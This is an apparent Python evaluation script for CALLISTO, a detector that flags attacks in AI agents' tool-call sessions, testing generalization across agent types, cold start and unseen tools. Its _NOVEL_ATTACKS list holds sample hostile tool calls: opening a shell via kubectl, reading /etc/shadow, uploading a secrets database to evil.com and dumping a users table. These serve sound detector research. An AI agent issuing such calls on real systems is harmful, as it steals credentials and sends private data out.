"""Cross-scenario generalization experiments for CALLISTO detection system."""

from __future__ import annotations

import random
import time
import json
import numpy as np
from pathlib import Path

from callisto.config import CallistoConfig
from callisto.engine import CallistoEngine
from callisto.attacks.simulator import (
    generate_dataset, generate_benign_session, _make_event, _BENIGN_TOOLS,
    generate_rate_flood, generate_priv_escalation, generate_data_exfil,
    generate_behavior_drift, generate_temporal_violation, generate_state_poison,
)
from callisto.evaluation.metrics import evaluate_detector, per_attack_metrics, EvalMetrics
from callisto.collector.models import Session, CallEvent, EventType, AttackType


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

_AGENT_TOOL_POOLS = {
    "coding": ["read_file", "write_file", "search", "exec", "list_files"],
    "data": ["read_file", "list_files", "get_info", "summarize", "search"],
    "ops": ["exec", "shell", "http_request", "list_files", "read_file"],
}

_ATTACK_GENERATORS = [
    generate_rate_flood,
    generate_priv_escalation,
    generate_data_exfil,
    generate_behavior_drift,
    generate_temporal_violation,
    generate_state_poison,
]


def _fmt(m: EvalMetrics) -> dict:
    return {
        "precision": round(m.precision, 4),
        "recall": round(m.recall, 4),
        "f1": round(m.f1, 4),
        "fpr": round(m.fpr, 4),
        "tp": m.tp, "fp": m.fp, "tn": m.tn, "fn": m.fn,
    }


def generate_typed_benign(
    agent_type: str, agent_id: str, n_calls: int = 30, seed: int | None = None,
) -> Session:
    """Generate a benign session with tool distribution specific to *agent_type*."""
    rng = random.Random(seed)
    pool = _AGENT_TOOL_POOLS[agent_type]
    session = Session(
        session_id=f"benign_{agent_type}_{rng.randint(0, 99999):05d}",
        agent_id=agent_id,
    )
    t = time.time()
    for _ in range(n_calls):
        t += rng.uniform(0.5, 5.0)
        tool = rng.choice(pool)
        session.add_event(_make_event(tool, t, {"task": f"t_{rng.randint(0, 100)}"}))
    return session


def _generate_agent_data(
    agent_type: str, agent_id: str, n_benign: int, n_per_attack: int, seed: int,
) -> tuple[list[Session], list[Session]]:
    """Return (benign_sessions, attack_sessions) for one agent type."""
    rng = random.Random(seed)
    benign = [
        generate_typed_benign(agent_type, agent_id, seed=rng.randint(0, 1_000_000))
        for _ in range(n_benign)
    ]
    attacks = []
    for gen in _ATTACK_GENERATORS:
        for _ in range(n_per_attack):
            attacks.append(gen(agent_id=agent_id, seed=rng.randint(0, 1_000_000)))
    return benign, attacks


def _eval_scenario(
    train_benign: list[Session],
    test_sessions: list[Session],
    config: CallistoConfig,
) -> dict:
    """Train on *train_benign*, evaluate on *test_sessions*, return metrics dict."""
    engine = CallistoEngine(config)
    engine.train_fingerprints(train_benign)
    alerts = [engine.analyze_session(s) for s in test_sessions]
    m = evaluate_detector(test_sessions, alerts)
    return _fmt(m)


# ---------------------------------------------------------------------------
# Experiment 1: Cross-Agent Generalization
# ---------------------------------------------------------------------------

def run_cross_agent_test(
    seed: int = 42, output_dir: str = "./eval_results",
) -> dict:
    """Test CALLISTO generalisation across different agent tool distributions."""
    print("=" * 70)
    print("  Experiment 1: Cross-Agent Generalization")
    print("=" * 70)

    rng = random.Random(seed)
    config = CallistoConfig(seed=seed)

    agents = {
        "A": ("coding", "coding_agent"),
        "B": ("data", "data_agent"),
        "C": ("ops", "ops_agent"),
    }

    data: dict[str, tuple[list[Session], list[Session]]] = {}
    for key, (atype, aid) in agents.items():
        b, a = _generate_agent_data(atype, aid, 50, 15, rng.randint(0, 1_000_000))
        data[key] = (b, a)
        print(f"  Agent {key} ({atype}): {len(b)} benign, {len(a)} attack")

    scenarios = {
        "train_A__test_A": (["A"], ["A"]),
        "train_A__test_B": (["A"], ["B"]),
        "train_A__test_C": (["A"], ["C"]),
        "train_AB__test_C": (["A", "B"], ["C"]),
        "train_ALL__test_ALL": (["A", "B", "C"], ["A", "B", "C"]),
    }

    results: dict[str, dict] = {}
    for name, (train_keys, test_keys) in scenarios.items():
        train_benign = []
        for k in train_keys:
            train_benign.extend(data[k][0])
        test_sessions = []
        for k in test_keys:
            test_sessions.extend(data[k][0])  # benign test
            test_sessions.extend(data[k][1])  # attack test
        rng_s = random.Random(seed)
        rng_s.shuffle(test_sessions)

        m = _eval_scenario(train_benign, test_sessions, config)
        results[name] = m
        print(f"  {name:<25s}  F1={m['f1']:.4f}  Prec={m['precision']:.4f}  "
              f"Rec={m['recall']:.4f}  FPR={m['fpr']:.4f}")

    out = Path(output_dir)
    out.mkdir(parents=True, exist_ok=True)
    with open(out / "cross_agent.json", "w") as f:
        json.dump(results, f, indent=2)
    print(f"  Saved to {out / 'cross_agent.json'}\n")
    return results


# ---------------------------------------------------------------------------
# Experiment 2: Cold-Start Meta-Adaptive Hazard Test
# ---------------------------------------------------------------------------

def run_cold_start_test(
    seed: int = 42, output_dir: str = "./eval_results",
) -> dict:
    """Compare MA-BOCPD with learned prototypes vs cold-start (no training)."""
    print("=" * 70)
    print("  Experiment 2: Cold-Start Meta-Adaptive Hazard Test")
    print("=" * 70)

    sessions = generate_dataset(n_benign=100, n_per_attack=30, seed=seed)
    benign = [s for s in sessions if all(e.label.value == "benign" for e in s.events)]
    config = CallistoConfig(seed=seed)

    # --- Warm start: train fingerprints normally ---
    print("  Running warm-start (trained prototypes)...")
    engine_warm = CallistoEngine(config)
    engine_warm.train_fingerprints(benign[:50])
    t0 = time.time()
    warm_alerts = [engine_warm.analyze_session(s) for s in sessions]
    warm_time = time.time() - t0
    m_warm = evaluate_detector(sessions, warm_alerts)

    # --- Cold start: skip training entirely ---
    print("  Running cold-start (random prototypes)...")
    engine_cold = CallistoEngine(config)
    engine_cold.train_fingerprints([])  # no training data
    t0 = time.time()
    cold_alerts = [engine_cold.analyze_session(s) for s in sessions]
    cold_time = time.time() - t0
    m_cold = evaluate_detector(sessions, cold_alerts)

    # Detection latency comparison
    from callisto.evaluation.metrics import detection_latency
    warm_lat = detection_latency(sessions, warm_alerts)
    cold_lat = detection_latency(sessions, cold_alerts)

    results = {
        "warm_start": {
            **_fmt(m_warm),
            "mean_latency": round(float(np.mean(warm_lat)), 2) if warm_lat else None,
            "runtime_ms": round(warm_time * 1000, 1),
        },
        "cold_start": {
            **_fmt(m_cold),
            "mean_latency": round(float(np.mean(cold_lat)), 2) if cold_lat else None,
            "runtime_ms": round(cold_time * 1000, 1),
        },
    }

    for label, r in results.items():
        print(f"  {label:<14s}  F1={r['f1']:.4f}  Prec={r['precision']:.4f}  "
              f"Rec={r['recall']:.4f}  FPR={r['fpr']:.4f}  "
              f"latency={r['mean_latency']}")

    out = Path(output_dir)
    out.mkdir(parents=True, exist_ok=True)
    with open(out / "cold_start.json", "w") as f:
        json.dump(results, f, indent=2)
    print(f"  Saved to {out / 'cold_start.json'}\n")
    return results


# ---------------------------------------------------------------------------
# Experiment 3: Tool Set Transfer
# ---------------------------------------------------------------------------

_NOVEL_ATTACKS = [
    # (tool_name, params, attack_type)
    ("kubectl", {"cmd": "exec -it pod -- /bin/sh"}, AttackType.A2_PRIV_ESCALATION),
    ("docker_exec", {"container": "app", "cmd": "cat /etc/shadow"}, AttackType.A2_PRIV_ESCALATION),
    ("sftp_upload", {"host": "evil.com", "file": "/data/secrets.db"}, AttackType.A3_DATA_EXFIL),
    ("db_query", {"query": "SELECT * FROM users"}, AttackType.A3_DATA_EXFIL),
]


def _generate_novel_attack_session(
    rng: random.Random, agent_id: str = "agent_0",
) -> Session:
    """Session with standard benign preamble followed by attacks using novel tools."""
    session = Session(
        session_id=f"novel_{rng.randint(0, 99999):05d}", agent_id=agent_id,
    )
    t = time.time()
    # Benign preamble
    for _ in range(10):
        t += rng.uniform(1.0, 3.0)
        session.add_event(_make_event(rng.choice(_BENIGN_TOOLS), t))
    # Novel-tool attack phase
    for tool, params, atype in _NOVEL_ATTACKS:
        t += rng.uniform(0.2, 1.0)
        session.add_event(_make_event(tool, t, params, atype))
    return session


def run_tool_transfer_test(
    seed: int = 42, output_dir: str = "./eval_results",
) -> dict:
    """Test detection of attacks that use tools unseen during training."""
    print("=" * 70)
    print("  Experiment 3: Tool Set Transfer")
    print("=" * 70)

    rng = random.Random(seed)
    config = CallistoConfig(seed=seed)

    # Training: standard benign sessions
    train_benign = [
        generate_benign_session(seed=rng.randint(0, 1_000_000)) for _ in range(80)
    ]

    # Test set: mix of standard benign + novel-tool attacks
    test_benign = [
        generate_benign_session(seed=rng.randint(0, 1_000_000)) for _ in range(40)
    ]
    test_novel = [
        _generate_novel_attack_session(random.Random(rng.randint(0, 1_000_000)))
        for _ in range(60)
    ]
    test_sessions = test_benign + test_novel
    rng.shuffle(test_sessions)

    print(f"  Train: {len(train_benign)} benign")
    print(f"  Test:  {len(test_benign)} benign + {len(test_novel)} novel-tool attacks")

    m = _eval_scenario(train_benign, test_sessions, config)
    pa = per_attack_metrics(
        test_sessions,
        [CallistoEngine(config).analyze_session(s) for s in test_sessions],
    )
    # Re-run with trained engine for per-attack (reuse helper)
    engine = CallistoEngine(config)
    engine.train_fingerprints(train_benign)
    alerts_all = [engine.analyze_session(s) for s in test_sessions]
    pa = per_attack_metrics(test_sessions, alerts_all)

    results = {
        "overall": m,
        "per_attack": {k: _fmt(v) for k, v in pa.items()},
    }

    print(f"  Overall  F1={m['f1']:.4f}  Prec={m['precision']:.4f}  "
          f"Rec={m['recall']:.4f}  FPR={m['fpr']:.4f}")
    for atype, am in pa.items():
        if atype != "benign":
            print(f"    {atype:<22s} F1={am.f1:.4f}")

    out = Path(output_dir)
    out.mkdir(parents=True, exist_ok=True)
    with open(out / "tool_transfer.json", "w") as f:
        json.dump(results, f, indent=2)
    print(f"  Saved to {out / 'tool_transfer.json'}\n")
    return results


# ---------------------------------------------------------------------------
# Main: run all experiments
# ---------------------------------------------------------------------------

def run_cross_scenario_experiments(
    seed: int = 42, output_dir: str = "./eval_results",
) -> dict:
    """Run all three cross-scenario generalization experiments."""
    print("\n" + "#" * 70)
    print("#  CALLISTO Cross-Scenario Generalization Experiments")
    print("#" * 70 + "\n")

    results = {}
    results["cross_agent"] = run_cross_agent_test(seed=seed, output_dir=output_dir)
    results["cold_start"] = run_cold_start_test(seed=seed, output_dir=output_dir)
    results["tool_transfer"] = run_tool_transfer_test(seed=seed, output_dir=output_dir)

    # --- Summary table ---
    print("=" * 70)
    print("  Summary")
    print("=" * 70)
    print(f"{'Experiment':<28s} {'F1':>8} {'Prec':>8} {'Rec':>8} {'FPR':>8}")
    print("-" * 70)

    for name, scenario_m in results["cross_agent"].items():
        print(f"  agent/{name:<22s} {scenario_m['f1']:>8.4f} "
              f"{scenario_m['precision']:>8.4f} {scenario_m['recall']:>8.4f} "
              f"{scenario_m['fpr']:>8.4f}")

    for label in ("warm_start", "cold_start"):
        r = results["cold_start"][label]
        print(f"  cold/{label:<23s} {r['f1']:>8.4f} {r['precision']:>8.4f} "
              f"{r['recall']:>8.4f} {r['fpr']:>8.4f}")

    tt = results["tool_transfer"]["overall"]
    print(f"  {'tool_transfer':<28s} {tt['f1']:>8.4f} {tt['precision']:>8.4f} "
          f"{tt['recall']:>8.4f} {tt['fpr']:>8.4f}")
    print("=" * 70)

    # Save combined results
    out = Path(output_dir)
    out.mkdir(parents=True, exist_ok=True)
    with open(out / "cross_scenario_all.json", "w") as f:
        json.dump(results, f, indent=2)
    print(f"\nAll results saved to {out / 'cross_scenario_all.json'}")

    return results


if __name__ == "__main__":
    run_cross_scenario_experiments()
